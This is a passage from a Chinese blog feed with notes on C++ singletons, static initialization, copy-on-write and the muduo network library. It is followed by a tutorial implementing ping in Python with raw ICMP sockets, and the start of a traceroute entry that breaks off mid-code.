punctuation">;</span>public<span class="token operator">:</span>  <span class="token keyword">static</span> Singleton<span class="token operator">&amp;</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> Singleton instance<span class="token punctuation">;</span>    <span class="token keyword">return</span> instance<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ul><li>non-local static对象（函数外）<br>C++规定，non-local static 对象的初始化发生在main函数执行之前，也即main函数之前的单线程启动阶段，所以不存在线程安全问题。但C++没有规定多个non-local static 对象的初始化顺序，尤其是来自多个编译单元的non-local static对象，他们的初始化顺序是随机的。</li><li><p>local static 对象（函数内）<br>对于local static 对象，其初始化发生在控制流第一次执行到该对象的初始化语句时。多个线程的控制流可能同时到达其初始化语句。</p><p>在C++11之前，在多线程环境下local static对象的初始化并不是线程安全的。具体表现就是：如果一个线程正在执行local static对象的初始化语句但还没有完成初始化，此时若其它线程也执行到该语句，那么这个线程会认为自己是第一次执行该语句并进入该local static对象的构造函数中。这会造成这个local static对象的重复构造，进而产生内存泄露问题。所以，local static对象在多线程环境下的重复构造问题是需要解决的。</p><p>而C++11则在语言规范中解决了这个问题。C++11规定，在一个线程开始local static 对象的初始化后到完成初始化前，其他线程执行到这个local static对象的初始化语句就会等待，直到该local static 对象初始化完成。</p></li><li><p>注意点<br>1、c++静态变量（const整数类型除外）一定要在类外进行定义和初始化（类内的只是声明，非初始化，不会分配内存）</p><p>2、单例模式的析构函数中不要释放（delete）单例对象，而是应该定义一个静态的嵌套类对象去析构单例对象。因为delete对象时，先要调用对象的析构函数，这会造成在析构函数中去调用析构函数的递归死循环，最后耗尽栈空间</p><p>3、单例的析构函数最好是私有的，否则别人可能会delete你的instance</p><p>4、GetInstance()肯定是static的，因为它不属于某个对象，最关键的是你也不能构造出类对象去调用它，所以必须是static的</p><p>5、由于GetInstance是static的，所以它内部用到的锁，也得是static的，不能属于类对象才行。</p></li></ul></li></ul><h1 id="性能相关"><a href="#性能相关" class="headerlink" title="性能相关"></a>性能相关</h1><h2 id="写入时复制，Copy-on-write"><a href="#写入时复制，Copy-on-write" class="headerlink" title="写入时复制，Copy-on-write"></a>写入时复制，Copy-on-write</h2><p>如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。<br>在muduo库中使用share_ptr实现copy-on-write</p><h1 id="Linux-相关"><a href="#Linux-相关" class="headerlink" title="Linux 相关"></a>Linux 相关</h1><h1 id="muduo-库相关学习"><a href="#muduo-库相关学习" class="headerlink" title="muduo 库相关学习"></a>muduo 库相关学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://github.com/chenshuo/muduo">muduo</a>是chenshuo大佬开源的一个基于<a href="https://youjiali1995.github.io/network/muduo/">reactor pattern的多线程网络库</a>，链接中有他的设计目标。</p><p>网络库一般关注3个方面：</p><ul><li>模型：Linux 下一般都是 Reactor 模式，常用的线程模型有<ul><li>Redis 的 one loop one thread</li><li>Nginx 的 one loop per process + SO_REUSEPORT</li><li>Muduo 的 one loop per thread + threadpool</li></ul></li><li>性能：一般模型确定下来，性能也就大差不差了，这点主要是实现上面考虑的，是追求极致的性能还是保证代码的易读性。</li><li>接口：既要保证通用性能够提供多种模型的选择和全面的功能，又要保证接口的易用性。</li></ul><p>Muduo 使用的是 one loop per thread + threadpool，即配置多个线程，每个线程跑一个 eventloop，一个线程只负责接受连接并分发给其他线程，之后该连接的所有 i/o 操作 都由该线程处理，threadpool 可以用来处理耗时长的任务。</p><h2 id="整体分析"><a href="#整体分析" class="headerlink" title="整体分析"></a>整体分析</h2><p>Reactor 模式涉及的类：</p><ul><li>Channal： 封装 I/O 事件和回调，可以代表多种实体：listening fd、timer fd、event fd 等。</li><li>Poller：I/O Multiplexing 的基类，封装底层的系统调用(poll(2) 和 epoll(2))。根据 Channel 更新事件，并返回活跃的 Channel。</li><li>Eventloop：整合 Channel 和 Poller，提供更高层的接口，如定时器。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于python的ping和traceroute实现</title>
      <link href="/2021/10/02/%E5%9F%BA%E4%BA%8Epython%E7%9A%84ping%E5%92%8Ctraceroute%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/10/02/%E5%9F%BA%E4%BA%8Epython%E7%9A%84ping%E5%92%8Ctraceroute%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PING"><a href="#PING" class="headerlink" title="PING"></a>PING</h1><h2 id="ping需要实现的内容"><a href="#ping需要实现的内容" class="headerlink" title="ping需要实现的内容"></a>ping需要实现的内容</h2><p>首先用命令行使用ping命令，发现存在回复</p><pre class="language-bash" data-language="bash"><code class="language-bash">正在 Ping <span class="token number">114.114</span>.114.114 具有 <span class="token number">32</span> 字节的数据:来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>12ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">91</span>来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>13ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">86</span>来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>13ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">86</span>来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>12ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">84</span><span class="token number">114.114</span>.114.114 的 Ping 统计信息:    数据包: 已发送 <span class="token operator">=</span> <span class="token number">4</span>，已接收 <span class="token operator">=</span> <span class="token number">4</span>，丢失 <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% 丢失<span class="token punctuation">)</span>，往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:    最短 <span class="token operator">=</span> 12ms，最长 <span class="token operator">=</span> 13ms，平均 <span class="token operator">=</span> 12ms</code></pre><p>观察得到，需要获得的信息为往返行程的统计时间，丢包率以及TTL。所以需要实现的东西为ICMP包的封装和解包，IP包的封装和解包，IP包的接受与发送即可。</p><h2 id="IP包的封装和解包"><a href="#IP包的封装和解包" class="headerlink" title="IP包的封装和解包"></a>IP包的封装和解包</h2><p>python存在有套接字库，可以便捷的实现IP包的封装，需要注意的是，由于TTL值存在与IP包中，在解包过程中需要获得该信息，下图为IP包的的格式，ICMP在IP包的数据部分。<br><img src="IP_format.png" alt="IP_format"><em>IP包头的格式</em></p><h2 id="ICMP包的封装和解包"><a href="#ICMP包的封装和解包" class="headerlink" title="ICMP包的封装和解包"></a>ICMP包的封装和解包</h2><p>下图为ICMP包的封装和报文格式。从表格和图就可以看出，要实现的PING协议的ICMP协议需要的各种参数。<br><img src="ICMP_Encapsulation.png" alt="ICMP_Encapsulation"><em>ICMP的封装</em><br><img src="ICMP_format.png" alt="ICMP_format"><em>ICMP的报文格式</em><br><img src="PING_format.png" alt="PING_format"><em>回送请求和应答的报文格式</em></p><div class="table-container"><table><thead><tr><th>类型</th><th>ICMP报文意义</th><th>类型</th><th>ICMP报文意义</th></tr></thead><tbody><tr><td>0</td><td>回送应答</td><td>12</td><td>数据报参数错</td></tr><tr><td>3</td><td>目的地不可达</td><td>13</td><td>时间戳请求</td></tr><tr><td>4</td><td>源站抑制(Source Quench)</td><td>14</td><td>时间戳应答</td></tr><tr><td>5</td><td>重定向(改变路由)</td><td>15</td><td>信息请求(已过时）</td></tr><tr><td>8</td><td>回送请求</td><td>16</td><td>信息应答(已过时)</td></tr><tr><td>9</td><td>路由器通告(advertisement)</td><td>17</td><td>地址掩码(Address Mask)请求</td></tr><tr><td>10</td><td>路由器恳求(solicitation)</td><td>18</td><td>地址掩码(Address Mask)应答</td></tr><tr><td>11</td><td>数据报超时</td><td></td></tr></tbody></table></div><h2 id="使用的库的官方文档"><a href="#使用的库的官方文档" class="headerlink" title="使用的库的官方文档"></a>使用的库的官方文档</h2><p><a href="https://docs.python.org/zh-cn/3/library/struct.html">struct库</a>：将字节串解读为打包的二进制数据</p><p><a href="https://docs.python.org/zh-cn/3/library/socket.html">socket库</a>：底层网络接口</p><p><a href="https://docs.python.org/zh-cn/3/library/select.html">select</a>库：等待 I/O 完成</p><h2 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:utf-8</span><span class="token comment"># author:YGL</span><span class="token keyword">import</span> time<span class="token keyword">import</span> struct<span class="token keyword">import</span> socket<span class="token keyword">import</span> select<span class="token keyword">import</span> sys<span class="token keyword">class</span> <span class="token class-name">PING</span><span class="token punctuation">:</span>    IP_HEADER_LENGTH <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">chesksum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        m <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">2</span>        <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> m<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>                <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>            <span class="token punctuation">)</span>  <span class="token comment">#传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位</span>        <span class="token keyword">if</span> m<span class="token punctuation">:</span>            <span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">#将高于16位与低16位相加</span>        <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span>        <span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#如果还有高于16位，将继续与低16位相加</span>        answer <span class="token operator">=</span> <span class="token operator">~</span><span class="token builtin">sum</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>        <span class="token comment">#  主机字节序转网络字节序列（参考小端序转大端序）</span>        answer <span class="token operator">=</span> answer <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">|</span> <span class="token punctuation">(</span>answer <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xff00</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> answer    <span class="token keyword">def</span> <span class="token function">request_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span> data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                     data_Sequence<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#  把字节打包成二进制数据</span>        imcp_packet <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span>chesksum<span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  <span class="token comment">#获取校验和</span>        <span class="token comment">#  把校验和传入，再次打包</span>        imcp_packet <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    <span class="token keyword">def</span> <span class="token function">raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        连接套接字,并将数据发送到套接字        '''</span>        <span class="token comment">#实例化一个socket对象，ipv4，原套接字，分配协议端口</span>        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span>getprotobyname<span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#记录当前请求时间</span>        send_request_ping_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#发送数据到网络</span>        rawsocket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#返回数据</span>        <span class="token keyword">return</span> send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    <span class="token keyword">def</span> <span class="token function">reply_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>                   send_request_ping_time<span class="token punctuation">,</span>                   rawsocket<span class="token punctuation">,</span>                   data_Sequence<span class="token punctuation">,</span>                   timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment">#开始时间</span>            started_select <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment">#实例化select对象，可读rawsocket，可写为空，可执行为空，超时时间</span>            what_ready <span class="token operator">=</span> select<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>            <span class="token comment">#等待时间</span>            wait_for_time <span class="token operator">=</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> started_select<span class="token punctuation">)</span>            <span class="token comment">#没有返回可读的内容，判断超时</span>            <span class="token keyword">if</span> what_ready<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment"># Timeout</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>            <span class="token comment">#记录接收时间</span>            time_received <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment">#设置接收的包的字节为1024</span>            received_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token comment">#获取接收包的icmp头</span>            icmpHeader <span class="token operator">=</span> received_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span>            <span class="token comment">#反转编码</span>            <span class="token builtin">type</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>                <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmpHeader<span class="token punctuation">)</span>            ttl <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_ip_header<span class="token punctuation">(</span>received_packet<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> sequence <span class="token operator">==</span> data_Sequence<span class="token punctuation">:</span>                <span class="token keyword">return</span> time_received <span class="token operator">-</span> send_request_ping_time<span class="token punctuation">,</span> ttl            <span class="token comment">#数据包的超时时间判断</span>            timeout <span class="token operator">=</span> timeout <span class="token operator">-</span> wait_for_time            <span class="token keyword">if</span> timeout <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> ttl    <span class="token keyword">def</span> <span class="token function">parse_ip_header</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip_header<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        IP报文格式        1. 4位IP-version 4位IP头长度 8位服务类型 16位报文总长度        2. 16位标识符 3位标记位 13位片偏移 暂时不关注此行        3. 8位TTL 8位协议 16位头部校验和        4. 32位源IP地址        5. 32位目的IP地址        :param ip_header:        :return:        """</span>        line1 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 先按照8位、8位、16位解析</span>        ip_version <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span>  <span class="token comment"># 通过右移4位获取高四位</span>        <span class="token comment"># 报文头部长度的单位是32位 即四个字节</span>        iph_length <span class="token operator">=</span> <span class="token punctuation">(</span>line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>  <span class="token comment"># 与1111与运算获取低四位</span>        packet_length <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line3 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        TTL <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        protocol <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        iph_checksum <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line4 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        src_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>line4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        line5 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dst_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>line5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token string">'ip_version'</span><span class="token punctuation">:</span> ip_version<span class="token punctuation">,</span>            <span class="token string">'iph_length'</span><span class="token punctuation">:</span> iph_length<span class="token punctuation">,</span>            <span class="token string">'packet_length'</span><span class="token punctuation">:</span> packet_length<span class="token punctuation">,</span>            <span class="token string">'TTL'</span><span class="token punctuation">:</span> TTL<span class="token punctuation">,</span>            <span class="token string">'protocol'</span><span class="token punctuation">:</span> protocol<span class="token punctuation">,</span>            <span class="token string">'iph_checksum'</span><span class="token punctuation">:</span> iph_checksum<span class="token punctuation">,</span>            <span class="token string">'src_ip'</span><span class="token punctuation">:</span> src_ip<span class="token punctuation">,</span>            <span class="token string">'dst_ip'</span><span class="token punctuation">:</span> dst_ip        <span class="token punctuation">&#125;</span>    <span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">:</span>        send<span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        sumtime<span class="token punctuation">,</span> shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> avgtime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        <span class="token comment">#icmp数据包的构建</span>        data_type <span class="token operator">=</span> <span class="token number">8</span>  <span class="token comment"># ICMP Echo Request</span>        data_code <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># must be zero</span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># "...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#Identifier</span>        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">#Sequence number</span>        payload_body <span class="token operator">=</span> <span class="token string">b'abcdefghijklmnopqrstuvwabcdefghi'</span>  <span class="token comment">#data</span>        <span class="token comment"># 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变</span>        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n正在 Ping &#123;0&#125; [&#123;1&#125;] 具有 32 字节的数据:"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            send <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>            <span class="token comment">#请求ping数据包的二进制转换</span>            icmp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span>request_ping<span class="token punctuation">(</span>data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                            data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                                            data_Sequence <span class="token operator">+</span> i<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span>            <span class="token comment">#连接套接字,并将数据发送到套接字</span>            send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> addr <span class="token operator">=</span> self<span class="token punctuation">.</span>raw_socket<span class="token punctuation">(</span>                dst_addr<span class="token punctuation">,</span> icmp_packet<span class="token punctuation">)</span>            <span class="token comment">#数据包传输时间</span>            times<span class="token punctuation">,</span> ttl <span class="token operator">=</span> self<span class="token punctuation">.</span>reply_ping<span class="token punctuation">(</span>send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span>                                         data_Sequence <span class="token operator">+</span> i<span class="token punctuation">)</span>            <span class="token keyword">if</span> times <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"来自 &#123;0&#125; 的回复: 字节 = 32 时间 = &#123;1&#125;ms TTL = &#123;2&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                    addr<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ttl<span class="token punctuation">[</span><span class="token string">'TTL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                accept <span class="token operator">+=</span> <span class="token number">1</span>                return_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>                sumtime <span class="token operator">+=</span> return_time                longtime <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>longtime<span class="token punctuation">,</span> return_time<span class="token punctuation">)</span>                shorttime <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>return_time<span class="token punctuation">,</span> shorttime<span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.7</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                lost <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请求超时。"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> send <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n&#123;0&#125; 的 Ping 统计信息:"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>                    <span class="token string">"\t数据包：已发送 = &#123;0&#125;,接收 = &#123;1&#125;，丢失 = &#123;2&#125;（&#123;3&#125;%丢失），\n往返行程的估计时间（以毫秒为单位）：\n\t最短 = &#123;4&#125;ms，最长 = &#123;5&#125;ms，平均 = &#123;6&#125;ms"</span>                    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost<span class="token punctuation">,</span> lost <span class="token operator">/</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span>                            shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> sumtime <span class="token operator">/</span> send<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><p><img src="PING.png" alt="PING"><em>代码效果</em></p><h1 id="TRACEROUTE"><a href="#TRACEROUTE" class="headerlink" title="TRACEROUTE"></a>TRACEROUTE</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>因为和 PING 命令差不多 ，只需要更改TTL值即可，所以可以直接移用代码。实验过程需要关闭防火墙。</p><h2 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">encoding</span><span class="token expression"><span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span></span></span><span class="token keyword">import</span> <span class="token module">time</span><span class="token keyword">import</span> <span class="token keyword">struct</span><span class="token keyword">import</span> <span class="token module">socket</span><span class="token keyword">import</span> <span class="token module">select</span><span class="token keyword">import</span> <span class="token module">sys</span>from typing <span class="token keyword">import</span> <span class="token module">DefaultDict</span><span class="token keyword">class</span> <span class="token class-name">TraceRoute</span><span class="token punctuation">(</span>PING<span class="token punctuation">)</span><span class="token 